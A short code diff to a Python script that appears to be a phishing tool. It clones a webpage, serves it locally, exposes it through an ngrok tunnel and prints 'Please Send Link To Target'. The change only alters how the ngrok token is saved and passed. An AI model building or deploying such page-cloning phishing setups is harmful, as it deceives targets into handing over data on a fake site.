@@ -92,7 +92,10 @@ def ngrok_token_check():
 		ngrok_token = input("Enter you ngrok token: ")
 		print("\n\n")
 		p = open("config.txt","w")
+		p.write('{ "ngrok_token": "')
 		p.write(ngrok_token)
+		p.write('"}')
+		p.close()
 		
 	return ngrok_token
 		
@@ -103,7 +106,8 @@ def main():
 	content = clone_webpage()
 	write_webpage(content)
 	deafult_server()
-	a = ngrok.connect(8786,"http",auth_token=ngrok_token)
+	ngrok.set_auth_token(ngrok_token)
+	a = ngrok.connect(8786,"http")
 	print(Fore.GREEN+"\n [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
 	print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
 	while True:
